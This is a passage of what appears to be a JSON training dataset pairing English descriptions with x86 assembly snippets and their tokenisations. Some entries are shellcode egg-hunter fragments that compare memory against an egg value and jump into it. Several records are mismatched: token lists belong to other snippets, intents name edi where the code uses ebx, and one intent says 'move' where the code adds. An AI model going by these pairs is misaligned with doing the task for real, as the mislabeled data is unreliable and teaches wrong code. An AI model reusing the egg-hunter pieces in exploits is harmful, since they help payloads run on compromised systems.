    "intent": "compare the dword at the memory location [eax-8] with the value of egg",
    "rewritten_intent": "compare the dword at the memory location [eax-8] with the value of egg",
    "snippet": "cmp dword [eax-8],egg",
    "slot_map": {
      "eax-8": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "compare",
      "dword",
      "memory",
      "location",
      "[",
      "var1",
      "]",
      "value",
      "egg"
    ],
    "snippet_tokens": [
      "cmp",
      "dl",
      ",",
      "cl",
      "\\n",
      "jb",
      "var0",
      "\\n",
      "mov",
      "al",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the jne _start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register",
    "rewritten_intent": "jump to the jne _start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register",
    "snippet": "cmp DWORD [eax], 0x4f904790 \\n jne _start \\n jmp eax",
    "slot_map": {
      "0x4f904790": "var4",
      "jne": "var0",
      "_start": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "var1",
      "label",
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var2",
      "register",
      "not",
      "equal",
      "doubleword",
      "value",
      "var4",
      "else",
      "jump",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var2",
      "]",
      ",",
      "var4",
      "\\n",
      "var0",
      "var1",
      "\\n",
      "jmp",
      "var2"
    ]
  },
  {
    "intent": "if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register",
    "rewritten_intent": "if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register",
    "snippet": "cmp DWORD [eax], 0x4f904790 \\n jne _start \\n jmp eax",
    "slot_map": {
      "0x4f904790": "var2",
      "eax": "var0",
      "jne": "var3",
      "_start": "var4"
    },
    "intent_tokens": [
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "not",
      "equal",
      "doubleword",
      "value",
      "var2",
      "then",
      "jump",
      "var3",
      "var4",
      "label",
      "else",
      "jump",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var0",
      "]",
      ",",
      "var2",
      "\\n",
      "var3",
      "var4",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "compare the dword at the address [eax] and the contents of the ebx register",
    "rewritten_intent": "compare the dword at the address [eax] and the contents of the ebx register",
    "snippet": "cmp dword [eax], ebx",
    "slot_map": {
      "eax": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "compare",
      "dword",
      "address",
      "[",
      "var1",
      "]",
      "and",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var0",
      "]",
      ",",
      "var2",
      "\\n",
      "var3",
      "var4",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register",
    "rewritten_intent": "jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register",
    "snippet": "cmp dword [eax], ebx \\n jne next_addr \\n jmp eax",
    "slot_map": {
      "next_address": "var0",
      "eax": "var1",
      "ebx": "var3",
      "regoster": "var4"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "not",
      "equal",
      "contents",
      "var3",
      "var4",
      "else",
      "jump",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "dword",
      "[",
      "var1",
      "]",
      ",",
      "var3",
      "\\n",
      "jne",
      "next_addr",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register",
    "rewritten_intent": "if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register",
    "snippet": "cmp dword [eax], ebx \\n jne next_addr \\n jmp eax",
    "slot_map": {
      "next_address": "var4",
      "eax": "var0",
      "ebx": "var2",
      "regoster": "var3"
    },
    "intent_tokens": [
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var2",
      "var3",
      "then",
      "jump",
      "var4",
      "label",
      "else",
      "jump",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "dword",
      "[",
      "var0",
      "]",
      ",",
      "var2",
      "\\n",
      "jne",
      "next_addr",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the loop label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register",
    "rewritten_intent": "jump to the loop label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register",
    "snippet": "cmp DWORD [eax], edx \\n jne loop \\n jmp eax",
    "slot_map": {
      "eax": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "jump",
      "loop",
      "label",
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var2",
      "register",
      "else",
      "jump",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var0",
      "]",
      ",",
      "var2",
      "\\n",
      "jne",
      "loop",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register",
    "rewritten_intent": "if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register",
    "snippet": "cmp DWORD [eax], edx \\n jne loop \\n jmp eax",
    "slot_map": {
      "eax": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var2",
      "register",
      "then",
      "jump",
      "loop",
      "label",
      "else",
      "jump",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var0",
      "]",
      ",",
      "var2",
      "\\n",
      "jne",
      "loop",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register",
    "rewritten_intent": "jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register",
    "snippet": "cmp DWORD [eax], edx \\n jne search_the_egg \\n jmp eax",
    "slot_map": {
      "eax": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "jump",
      "while",
      "label",
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var2",
      "register",
      "else",
      "jump",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var0",
      "]",
      ",",
      "var2",
      "\\n",
      "jne",
      "search_the_egg",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register",
    "rewritten_intent": "jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register",
    "snippet": "cmp DWORD [eax], edx \\n jne search_the_egg \\n jmp eax",
    "slot_map": {
      "search_the_egg": "var0",
      "eax": "var1",
      "edx": "var3"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var1",
      "register",
      "not",
      "equal",
      "contents",
      "var3",
      "register",
      "else",
      "jump",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var1",
      "]",
      ",",
      "var3",
      "\\n",
      "jne",
      "var0",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register",
    "rewritten_intent": "if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register",
    "snippet": "cmp DWORD [eax], edx \\n jne search_the_egg \\n jmp eax",
    "slot_map": {
      "eax": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var2",
      "register",
      "then",
      "jump",
      "while",
      "label",
      "else",
      "jump",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var0",
      "]",
      ",",
      "var2",
      "\\n",
      "jne",
      "search_the_egg",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register",
    "rewritten_intent": "if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register",
    "snippet": "cmp DWORD [eax], edx \\n jne search_the_egg \\n jmp eax",
    "slot_map": {
      "search_the_egg": "var3",
      "eax": "var0",
      "edx": "var2"
    },
    "intent_tokens": [
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var2",
      "register",
      "then",
      "jump",
      "var3",
      "label",
      "else",
      "jump",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var0",
      "]",
      ",",
      "var2",
      "\\n",
      "jne",
      "var3",
      "\\n",
      "jmp",
      "var0"
    ]
  },
  {
    "intent": "jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270",
    "rewritten_intent": "jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270",
    "snippet": "cmp DWORD [edx], 0x636f7270 \\n je while",
    "slot_map": {
      "0x636f7270": "var1",
      "edx": "var0"
    },
    "intent_tokens": [
      "jump",
      "while",
      "label",
      "if",
      "doubleword",
      "starting",
      "address",
      "contained",
      "var0",
      "register",
      "equal",
      "doubleword",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "DWORD",
      "[",
      "var0",
      "]",
      ",",
      "var1",
      "\\n",
      "je",
      "while"
    ]
  },
  {
    "intent": "compare the doubleword stored at memory location var to the integer value 10",
    "rewritten_intent": "compare the doubleword stored at memory location var to the integer value 10",
    "snippet": "cmp dword [var], 10",
    "slot_map": {},
    "intent_tokens": [
      "compare",
      "doubleword",
      "stored",
      "memory",
      "location",
      "var",
      "integer",
      "value",
      "10"
    ],
    "snippet_tokens": [
      "cmp",
      "dword",
      "[",
      "var",
      "]",
      ",",
      "10"
    ]
  },
  {
    "intent": "compare the dx value with zero",
    "rewritten_intent": "compare the dx value with zero",
    "snippet": "cmp dx, 00",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "value",
      "zero"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "00"
    ]
  },
  {
    "intent": "jump to the L1 label if the contents of the dx register is equal to the value 0x03e8",
    "rewritten_intent": "jump to the L1 label if the contents of the dx register is equal to the value 0x03e8",
    "snippet": "cmp dx, 0x03e8 \\n je L1",
    "slot_map": {
      "L1": "var0",
      "0x03e8": "var2",
      "dx": "var1"
    },
    "intent_tokens": [
      "jump",
      "var0",
      "label",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "value",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label",
    "rewritten_intent": "if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label",
    "snippet": "cmp dx, 0x03e8 \\n je L1",
    "slot_map": {
      "L1": "var3",
      "0x03e8": "var1",
      "dx": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "value",
      "var1",
      "then",
      "jump",
      "var3",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "var3"
    ]
  },
  {
    "intent": "compare eax to zero",
    "rewritten_intent": "compare eax to zero",
    "snippet": "cmp eax, 0",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "zero"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "compare if eax is equal to 0",
    "rewritten_intent": "compare if eax is equal to 0",
    "snippet": "cmp eax, 0",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "var0",
      "equal",
      "0"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "compare if eax is zero",
    "rewritten_intent": "compare if eax is zero",
    "snippet": "cmp eax, 0",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "compare",
      "if",
      "var0",
      "zero"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "compare the contents of eax and the contents of eax",
    "rewritten_intent": "compare the contents of eax and the contents of eax",
    "snippet": "cmp eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "and",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register",
    "rewritten_intent": "jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register",
    "snippet": "cmp eax, eax \\n jne 0x8",
    "slot_map": {
      "0x8": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "address",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "equal",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var1",
      "\\n",
      "jne",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8",
    "rewritten_intent": "if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8",
    "snippet": "cmp eax, eax \\n jne 0x8",
    "slot_map": {
      "0x8": "var2",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var0",
      "register",
      "then",
      "jump",
      "memory",
      "address",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var0",
      "\\n",
      "jne",
      "var2"
    ]
  },
  {
    "intent": "jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register else zero out the eax register",
    "rewritten_intent": "jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register else zero out the eax register",
    "snippet": "cmp eax, eax \\n jne 0x8 \\n xor eax, eax",
    "slot_map": {
      "0x8": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "address",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "equal",
      "contents",
      "var1",
      "register",
      "else",
      "zero",
      "out",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var1",
      "\\n",
      "jne",
      "var0",
      "\\n",
      "xor",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register",
    "rewritten_intent": "if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register",
    "snippet": "cmp eax, eax \\n jne 0x8 \\n xor eax, eax",
    "slot_map": {
      "0x8": "var3",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var0",
      "register",
      "then",
      "jump",
      "memory",
      "address",
      "var3",
      "else",
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var0",
      "\\n",
      "jne",
      "var3",
      "\\n",
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register",
    "rewritten_intent": "jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register",
    "snippet": "cmp eax, ebp \\n jnz short loc_40102B",
    "slot_map": {
      "loc_40102B": "var0",
      "eax": "var1",
      "ebp": "var2"
    },
    "intent_tokens": [
      "jump",
      "short",
      "memory",
      "location",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "equal",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "var2",
      "\\n",
      "jnz",
      "short",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B",
    "rewritten_intent": "if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B",
    "snippet": "cmp eax, ebp \\n jnz short loc_40102B",
    "slot_map": {
      "loc_40102B": "var2",
      "eax": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "short",
      "memory",
      "location",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "jnz",
      "short",
      "var2"
    ]
  },
  {
    "intent": "compare eax with ebx",
    "rewritten_intent": "compare eax with ebx",
    "snippet": "cmp eax, ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "compare",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "compare the contents of eax and the contents of ebx",
    "rewritten_intent": "compare the contents of eax and the contents of ebx",
    "snippet": "cmp eax, ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "and",
      "contents",
      "var1"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "compare the contents of the eax register and the contents of the ebx register",
    "rewritten_intent": "compare the contents of the eax register and the contents of the ebx register",
    "snippet": "cmp eax, ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "compare",
      "contents",
      "var0",
      "register",
      "and",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register",
    "rewritten_intent": "jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register",
    "snippet": "cmp eax, ebx \\n je 0x47",
    "slot_map": {
      "0x47": "var0",
      "eax": "var1",
      "edi": "var2"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "address",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "ebx",
      "\\n",
      "je",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47",
    "snippet": "cmp eax, ebx \\n je 0x47",
    "slot_map": {
      "0x47": "var2",
      "eax": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "memory",
      "address",
      "var2"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "ebx",
      "\\n",
      "je",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register",
    "snippet": "cmp eax, ebx \\n je 0x47 \\n xor ecx, ecx",
    "slot_map": {
      "0x47": "var2",
      "eax": "var0",
      "edi": "var1",
      "ecx": "var3"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "memory",
      "address",
      "var2",
      "else",
      "zero",
      "out",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "ebx",
      "\\n",
      "je",
      "var2",
      "\\n",
      "xor",
      "var3",
      ",",
      "var3"
    ]
  },
  {
    "intent": "jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register",
    "rewritten_intent": "jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register",
    "snippet": "cmp eax, ebx \\n je 0x47 \\n xor ecx, ecx",
    "slot_map": {
      "0x47": "var0",
      "eax": "var1",
      "edi": "var2",
      "ecx": "var3"
    },
    "intent_tokens": [
      "jump",
      "memory",
      "address",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "equal",
      "contents",
      "var2",
      "register",
      "else",
      "zero",
      "out",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var1",
      ",",
      "ebx",
      "\\n",
      "je",
      "var0",
      "\\n",
      "xor",
      "var3",
      ",",
      "var3"
    ]
  },
  {
    "intent": "jump to the all label if the contents of the eax register is equal to the contents of the ebx register",
    "rewritten_intent": "jump to the all label if the contents of the eax register is equal to the contents of the ebx register",
    "snippet": "cmp eax, ebx \\n je all",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "jump",
      "all",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "all"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the all label",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the all label",
    "snippet": "cmp eax, ebx \\n je all",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "all",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "all"
    ]
  },
  {
    "intent": "jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register",
    "rewritten_intent": "jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register",
    "snippet": "cmp eax, ebx \\n je all \\n xor eax, eax",
    "slot_map": {
      "eax": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "jump",
      "all",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var2",
      "register",
      "else",
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var2",
      "\\n",
      "je",
      "all",
      "\\n",
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register",
    "snippet": "cmp eax, ebx \\n je all \\n xor eax, eax",
    "slot_map": {
      "eax": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var2",
      "register",
      "then",
      "jump",
      "all",
      "label",
      "else",
      "zero",
      "out",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var2",
      "\\n",
      "je",
      "all",
      "\\n",
      "xor",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "jump to the child label if the contents of the eax register is equal to the contents of the ebx register",
    "rewritten_intent": "jump to the child label if the contents of the eax register is equal to the contents of the ebx register",
    "snippet": "cmp eax, ebx \\n je child",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "jump",
      "child",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "child"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the child label",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the child label",
    "snippet": "cmp eax, ebx \\n je child",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "child",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "child"
    ]
  },
  {
    "intent": "jump to the connect label if the contents of the eax register is equal to the contents of the ebx register else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register",
    "rewritten_intent": "jump to the connect label if the contents of the eax register is equal to the contents of the ebx register else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register",
    "snippet": "cmp eax, ebx \\n je connect \\n ja exit",
    "slot_map": {
      "eax": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "jump",
      "connect",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var2",
      "register",
      "else",
      "jump",
      "exit",
      "label",
      "if",
      "unsigned",
      "contents",
      "var0",
      "register",
      "greater",
      "unsigned",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var2",
      "\\n",
      "je",
      "connect",
      "\\n",
      "ja",
      "exit"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the connect label else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the connect label else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register",
    "snippet": "cmp eax, ebx \\n je connect \\n ja exit",
    "slot_map": {
      "eax": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var2",
      "register",
      "then",
      "jump",
      "connect",
      "label",
      "else",
      "jump",
      "exit",
      "label",
      "if",
      "unsigned",
      "contents",
      "var0",
      "register",
      "greater",
      "unsigned",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var2",
      "\\n",
      "je",
      "connect",
      "\\n",
      "ja",
      "exit"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the download label",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the download label",
    "snippet": "cmp eax, ebx \\n je download",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "download",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "download"
    ]
  },
  {
    "intent": "jump to the download label if the contents of the eax register is equal to the contents of the ebx register",
    "rewritten_intent": "jump to the download label if the contents of the eax register is equal to the contents of the ebx register",
    "snippet": "cmp eax, ebx \\n je download",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "jump",
      "download",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "download"
    ]
  },
  {
    "intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label",
    "rewritten_intent": "if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label",
    "snippet": "cmp eax, ebx \\n je exit",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register",
      "then",
      "jump",
      "exit",
      "label"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "exit"
    ]
  },
  {
    "intent": "jump to the exit label if the contents of the eax register is equal to the contents of the ebx register",
    "rewritten_intent": "jump to the exit label if the contents of the eax register is equal to the contents of the ebx register",
    "snippet": "cmp eax, ebx \\n je exit",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "jump",
      "exit",
      "label",
      "if",
      "contents",
      "var0",
      "register",
      "equal",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "cmp",
      "var0",
      ",",
      "var1",
      "\\n",
      "je",
      "exit"
    ]
  },
  {
    "intent": "jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register",
    "rewritten_intent": "jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register",
    "snippet": "cmp eax, ebx \\n je exit \\n add al, 0x3",
    "slot_map": {
